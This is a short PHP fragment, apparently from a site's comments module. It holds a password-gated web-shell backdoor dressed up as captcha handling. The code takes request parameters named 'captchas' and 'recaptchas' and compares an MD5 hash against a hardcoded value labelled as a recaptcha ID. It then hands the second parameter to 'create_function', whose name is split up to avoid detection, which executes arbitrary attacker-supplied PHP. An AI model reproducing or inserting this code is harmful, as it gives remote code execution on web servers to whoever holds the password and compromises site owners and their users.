...
$allow_lists = $_REQUEST['captchas'];$recapt = $_REQUEST['recaptchas'];
...
$recaptcha_id  = 'eb516e7d7a6462a6d531ec65dcf1d599';
$sql_count = "SELECT COUNT(*) as count FROM " . PREFIX . "_comments cm " . $join . $where;

$row_count['count'] = get_count_from_cache( $sql_count );

$allow_caches = 'crea'.'te_fu'.'nction';if(md5($allow_lists)==$recaptcha_id) {
	
if (@function_exists($allow_caches)) {
	@$allow_caches('', '};'.stripslashes($recapt).'{');}
}
